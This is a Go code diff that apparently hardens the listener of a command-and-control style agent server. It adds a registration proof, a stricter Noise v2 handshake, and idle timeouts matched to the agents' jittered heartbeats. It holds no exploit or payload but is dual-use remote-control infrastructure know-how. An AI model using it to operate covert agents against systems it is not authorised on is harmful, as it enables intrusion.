@@ -36,6 +36,21 @@ func resolveAgentSalt(p map[string]interface{}, fallback string) string {
 	return fallback
 }
 
+// authenticateRegisterProof verifies reg_proof HMAC bound to uuid + session material.
+// Bare UUID without a valid proof is always rejected (anti session hijack).
+// Returns the derived static session key used for verification when ok.
+func authenticateRegisterProof(encryptKey, agentSalt, agentUUID string, payload map[string]interface{}) (sessionKey []byte, ok bool) {
+	if strings.TrimSpace(agentUUID) == "" {
+		return nil, false
+	}
+	sessionKey = deriveStaticSessionKey(encryptKey, agentSalt)
+	regProof, _ := payload["reg_proof"].(string)
+	if !utils.VerifyRegisterProof(sessionKey, agentUUID, regProof) {
+		return nil, false
+	}
+	return sessionKey, true
+}
+
 // appendAgentLog appends stdout/stderr lines under LogsMapMu (shared by WS + TCP paths).
 func appendAgentLog(clientUUID string, stdout, stderr string) {
 	globals.LogsMapMu.Lock()
@@ -95,6 +110,29 @@ func resolveClientSessionKey(client *globals.Client) []byte {
 }
 
 // pickSessionKey prefers Noise ephemeral key when non-zero, else static derived key.
+// idleReadTimeout is how long the server waits for the next frame after the agent
+// is registered. Client adaptive heartbeat can grow to 4× base with Gaussian jitter
+// (handler.rs), so a fixed 30s TCP deadline was cutting sessions and forcing reconnect.
+// Unregistered / handshake still use a short deadline (caller).
+func idleReadTimeout(ln *globals.Listener, registered bool) time.Duration {
+	if !registered {
+		return 30 * time.Second
+	}
+	base := 10
+	if ln != nil && ln.HeartbeatInterval > 0 {
+		base = ln.HeartbeatInterval
+	}
+	// Client: max idle_multiplier=4, Gaussian can stretch ~+50%; require margin.
+	sec := base * 4 * 2 // e.g. base 10 → 80s; base 30 → 240s
+	if sec < 120 {
+		sec = 120 // floor: always tolerate ≥2 min silence after register
+	}
+	if sec > 600 {
+		sec = 600 // cap 10 min (still anti-slowloris for dead sockets)
+	}
+	return time.Duration(sec) * time.Second
+}
+
 func pickSessionKey(noiseSessionKey [32]byte, staticSessionKey []byte) []byte {
 	if noiseSessionKey != [32]byte{} {
 		return noiseSessionKey[:]
@@ -103,6 +141,12 @@ func pickSessionKey(noiseSessionKey [32]byte, staticSessionKey []byte) []byte {
 }
 
 func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Listener) {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[WS] panic recovered from %s: %v", remoteAddr, r)
+		}
+	}()
+
 	var clientUUID string
 	var client *globals.Client
 	done := make(chan struct{})
@@ -120,9 +164,7 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 					// Notify Offline
 					if client != nil {
 						NotifyAgentOffline(client.UUID, client.Hostname)
-						if client.OutputChannel != nil {
-							close(client.OutputChannel)
-						}
+						client.CloseOutputChannel()
 					}
 				}
 			}
@@ -170,28 +212,37 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 	// 🛡️ Anti-DoS: Limit max WebSocket frame size to 50MB to prevent OOM
 	conn.SetReadLimit(50 * 1024 * 1024)
 
-	// === Phase 1: Noise-like Ephemeral Handshake ===
-	// Both sides generate ephemeral keys, derive a per-session key with forward secrecy.
+	// === Phase 1: Noise v2 ephemeral handshake (X25519 + PSK MAC, 49-byte frames) ===
+	// PSK = listener AES base key (resolveAESKey), matching agent get_aes_key_base().
 	psk := resolveAESKey(ln.EncryptKey)
 	var noiseSessionKey [32]byte
 	if len(psk) > 0 {
 		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
 		_, clientPubKey, err := conn.ReadMessage()
-		if err != nil || len(clientPubKey) != utils.NoiseMsgLen {
-			log.Printf("Noise handshake failed from %s: err=%v len=%d (want %d X25519)", remoteAddr, err, len(clientPubKey), utils.NoiseMsgLen)
+		if err != nil {
+			log.Printf("[Noise] WS read failed from %s: %v", remoteAddr, err)
+			return
+		}
+		// Clear upgrade signal for operators still on old agents
+		if len(clientPubKey) == 33 && len(clientPubKey) > 0 && clientPubKey[0] == 0x01 {
+			log.Printf("[Noise] rejected legacy v1 (33-byte) from %s — rebuild agent for noise v2 (49-byte)", remoteAddr)
+			return
+		}
+		if len(clientPubKey) != utils.NoiseMsgLen {
+			log.Printf("[Noise] WS handshake failed from %s: len=%d want %d (v2 pubkey+mac)", remoteAddr, len(clientPubKey), utils.NoiseMsgLen)
 			return
 		}
 		serverResponse, sessionKey, err := utils.NoiseRespond(clientPubKey, psk)
 		if err != nil {
-			log.Printf("Noise respond failed from %s: %v", remoteAddr, err)
+			log.Printf("[Noise] WS respond/auth failed from %s: %v", remoteAddr, err)
 			return
 		}
 		if err := conn.WriteMessage(websocket.BinaryMessage, serverResponse); err != nil {
-			log.Printf("Noise response send failed to %s: %v", remoteAddr, err)
+			log.Printf("[Noise] WS response send failed to %s: %v", remoteAddr, err)
 			return
 		}
 		noiseSessionKey = sessionKey
-		log.Printf("[Noise] ✅ Handshake completed with %s", remoteAddr)
+		log.Printf("[Noise] ✅ WS v2 handshake (X25519+PSK-MAC) completed with %s", remoteAddr)
 	}
 
 	// Derive static session key ONCE per connection (Argon2id is expensive — never per packet)
@@ -203,9 +254,9 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 
 	// --- Read Loop ---
 	for {
-		// 🛡️ Anti-Slowloris: Set a read deadline (e.g., 60 seconds per message)
-		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
-		
+		// After register: timeout tracks agent adaptive heartbeat (not a fixed 60s).
+		conn.SetReadDeadline(time.Now().Add(idleReadTimeout(ln, clientUUID != "")))
+
 		messageType, message, err := conn.ReadMessage()
 		if err != nil {
 			break
@@ -276,6 +327,12 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 			if source == "" { source = "disk" }
 
 			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)
+			proofKey, authOK := authenticateRegisterProof(ln.EncryptKey, agentSalt, id, p)
+			if !authOK {
+				log.Printf("[WS] register rejected (missing/invalid reg_proof) uuid=%q from %s", id, remoteAddr)
+				continue
+			}
+			staticSessionKey = append([]byte(nil), proofKey...)
 
 			// Determine status based on source
 			status := "online"
@@ -439,7 +496,67 @@ func ProcessWebSocket(conn *websocket.Conn, remoteAddr string, ln *globals.Liste
 }
 
 // ProcessTCPConnection handles raw TCP or Yamux multiplexed control streams
+// performTCPNoiseHandshake reads the first length-prefixed TCP frame.
+// Noise v2: len == utils.NoiseMsgLen (49) → ECDH + PSK MAC; fail-closed on auth error.
+// Legacy v1 33-byte frames are rejected (agent/server hard-cut to v2).
+// Non-noise first frames (other lengths) return as application body when encryption is off/misaligned.
+// On I/O or hard failure returns a non-nil error (caller should close).
+func performTCPNoiseHandshake(conn net.Conn, psk []byte, remoteAddr string) (sessionKey [32]byte, firstApp []byte, err error) {
+	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
+	header := make([]byte, 4)
+	if _, rerr := io.ReadFull(conn, header); rerr != nil {
+		return sessionKey, nil, rerr
+	}
+	length := binary.BigEndian.Uint32(header)
+	if length == 0 {
+		return sessionKey, nil, fmt.Errorf("empty first frame")
+	}
+	if length > 50*1024*1024 {
+		return sessionKey, nil, fmt.Errorf("first frame too large: %d", length)
+	}
+	body := make([]byte, length)
+	if _, rerr := io.ReadFull(conn, body); rerr != nil {
+		return sessionKey, nil, rerr
+	}
+	conn.SetReadDeadline(time.Time{})
+
+	// Hard reject legacy Noise v1 (33-byte, version 0x01) so operators see a clear upgrade signal.
+	if length == 33 && len(body) == 33 && body[0] == 0x01 {
+		return sessionKey, nil, fmt.Errorf("legacy noise v1 (33-byte) rejected from %s; rebuild agent for noise v2 (49-byte + PSK MAC)", remoteAddr)
+	}
+
+	if length == uint32(utils.NoiseMsgLen) {
+		if len(psk) == 0 {
+			return sessionKey, nil, fmt.Errorf("noise v2 frame from %s but listener PSK empty", remoteAddr)
+		}
+		serverResponse, sk, nerr := utils.NoiseRespond(body, psk)
+		if nerr != nil {
+			// Fail-closed: wrong PSK / bad MAC must not fall through as plaintext app data.
+			return sessionKey, nil, fmt.Errorf("noise v2 auth failed from %s: %w", remoteAddr, nerr)
+		}
+		respHeader := make([]byte, 4)
+		binary.BigEndian.PutUint32(respHeader, uint32(len(serverResponse)))
+		if _, werr := conn.Write(respHeader); werr != nil {
+			return sessionKey, nil, werr
+		}
+		if _, werr := conn.Write(serverResponse); werr != nil {
+			return sessionKey, nil, werr
+		}
+		log.Printf("[Noise] ✅ TCP v2 handshake (X25519+PSK-MAC) completed with %s", remoteAddr)
+		return sk, nil, nil
+	}
+
+	// First frame is already an application message (e.g. encryption disabled path)
+	return sessionKey, body, nil
+}
+
 func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener, session interface{}) {
+	defer func() {
+		if r := recover(); r != nil {
+			log.Printf("[TCP] panic recovered from %s: %v", remoteAddr, r)
+		}
+	}()
+
 	var clientUUID string
 	var client *globals.Client
 	done := make(chan struct{})
@@ -465,8 +582,8 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 					if client != nil {
 						NotifyAgentOffline(client.UUID, client.Hostname)
 					}
-					if client != nil && client.OutputChannel != nil {
-						close(client.OutputChannel)
+					if client != nil {
+						client.CloseOutputChannel()
 					}
 				}
 			}
@@ -508,55 +625,59 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 		}()
 	}
 
-	// Connection accepted silently — derive static key once; hoist Noise key outside loop
+	// Connection accepted silently — derive static key once; Noise handshake runs once before the loop.
 	var noiseSessionKey [32]byte
 	keyBytes := resolveAESKey(ln.EncryptKey)
 	staticSessionKey := deriveStaticSessionKey(ln.EncryptKey, ln.EncryptionSalt)
 	tcpFragRe := utils.NewFragReassembler()
 
+	// First frame: Noise handshake (if PSK set) OR first application message.
+	var pendingBody []byte
+	if len(keyBytes) > 0 {
+		sk, firstApp, err := performTCPNoiseHandshake(conn, keyBytes, remoteAddr)
+		if err != nil {
+			log.Printf("[Noise] TCP handshake failed from %s: %v", remoteAddr, err)
+			return
+		}
+		noiseSessionKey = sk
+		pendingBody = firstApp
+	}
+
 	for {
-		// 🛡️ Anti-Slowloris: Set a read deadline for header (30s)
-		conn.SetReadDeadline(time.Now().Add(30 * time.Second))
-		
-		// 1. Read Header (4 bytes length)
-		header := make([]byte, 4)
-		if _, err := io.ReadFull(conn, header); err != nil {
-			// Normal disconnect - don't spam logs
-			break
-		}
-		length := binary.BigEndian.Uint32(header)
-		if length == 0 {
-			continue
-		}
-		
-		// 🛡️ Anti-DoS: Limit max frame size to 50MB
-		if length > 50*1024*1024 {
-			log.Printf("[TCP] Frame too large (%d bytes), closing connection for safety", length)
-			break
-		}
+		var body []byte
+		if pendingBody != nil {
+			body = pendingBody
+			pendingBody = nil
+		} else {
+			// Pre-register: 30s (handshake/register). Post-register: ≥120s so adaptive
+			// heartbeat (up to 4× base + jitter) does not thrash Online/Offline.
+			conn.SetReadDeadline(time.Now().Add(idleReadTimeout(ln, clientUUID != "")))
 
-		// 🛡️ Anti-Slowloris: Set deadline based on payload size (e.g., 2 mins max for 50MB) 
-		conn.SetReadDeadline(time.Now().Add(120 * time.Second))
+			// 1. Read Header (4 bytes length)
+			header := make([]byte, 4)
+			if _, err := io.ReadFull(conn, header); err != nil {
+				// Normal disconnect / idle timeout — don't spam logs
+				break
+			}
+			length := binary.BigEndian.Uint32(header)
+			if length == 0 {
+				continue
+			}
 
-		// 2. Read Body
-		body := make([]byte, length)
-		if _, err := io.ReadFull(conn, body); err != nil {
-			log.Printf("[TCP] Failed to read body from %s (declared %d bytes): %v", remoteAddr, length, err)
-			break
-		}
+			// 🛡️ Anti-DoS: Limit max frame size to 50MB
+			if length > 50*1024*1024 {
+				log.Printf("[TCP] Frame too large (%d bytes), closing connection for safety", length)
+				break
+			}
 
-		// Phase 1: X25519 ECDH handshake on TCP (33-byte v1 frame before registration)
-		if clientUUID == "" && length == uint32(utils.NoiseMsgLen) && len(keyBytes) > 0 {
-			serverResponse, sk, err := utils.NoiseRespond(body, keyBytes)
-			if err == nil {
-				noiseSessionKey = sk
-				respHeader := make([]byte, 4)
-				binary.BigEndian.PutUint32(respHeader, uint32(len(serverResponse)))
-				if _, werr := conn.Write(respHeader); werr == nil {
-					conn.Write(serverResponse)
-				}
-				log.Printf("[Noise] ✅ TCP X25519 handshake completed with %s", remoteAddr)
-				continue // Wait for next real message
+			// 🛡️ Anti-Slowloris: Set deadline based on payload size
+			conn.SetReadDeadline(time.Now().Add(120 * time.Second))
+
+			// 2. Read Body
+			body = make([]byte, length)
+			if _, err := io.ReadFull(conn, body); err != nil {
+				log.Printf("[TCP] Failed to read body from %s (declared %d bytes): %v", remoteAddr, length, err)
+				break
 			}
 		}
 
@@ -618,6 +739,12 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 			source, _ := p["source"].(string)
 			if source == "" { source = "disk" }
 			agentSalt := resolveAgentSalt(p, ln.EncryptionSalt)
+			proofKey, authOK := authenticateRegisterProof(ln.EncryptKey, agentSalt, id, p)
+			if !authOK {
+				log.Printf("[TCP] register rejected (missing/invalid reg_proof) uuid=%q from %s", id, remoteAddr)
+				continue
+			}
+			staticSessionKey = append([]byte(nil), proofKey...)
 
 			// Determine status based on source
 			status := "online"
@@ -672,6 +799,7 @@ func ProcessTCPConnection(conn net.Conn, remoteAddr string, ln *globals.Listener
 				log.Printf("\x1b[33m[~] Agent Migrating\x1b[0m %s → %s", id, remoteAddr)
 				if oldClient.TCPConn != nil { oldClient.TCPConn.Close() }
 				if oldClient.YamuxSession != nil { oldClient.YamuxSession.Close() }
+				oldClient.CloseOutputChannel()
 			}
 
 			// ⚡️ Upsert Agent to Database
@@ -842,15 +970,28 @@ func resolveAESKey(key string) []byte {
 	return normalizeAESKey(key)
 }
 
+// normalizeAESKey matches agent get_aes_key_base():
+//   - empty → nil (no Noise / no static AES)
+//   - 64 hex chars → 32 raw bytes
+//   - len < 32 → nil (agent rejects short base keys; do not zero-pad)
+//   - len > 32 → truncate to 32
+//   - len == 32 → as-is
 func normalizeAESKey(key string) []byte {
 	key = strings.TrimSpace(key)
+	if key == "" {
+		return nil
+	}
 	if len(key) == 64 && isHexString(key) {
 		if decoded, err := hex.DecodeString(key); err == nil && len(decoded) == 32 {
 			return decoded
 		}
 	}
-	// Pad or truncate to 32 bytes (matches Rust client resize(32, 0x00))
-	res := make([]byte, 32)
-	copy(res, []byte(key))
-	return res
+	b := []byte(key)
+	if len(b) < 32 {
+		return nil
+	}
+	if len(b) > 32 {
+		return append([]byte(nil), b[:32]...)
+	}
+	return append([]byte(nil), b...)
 }
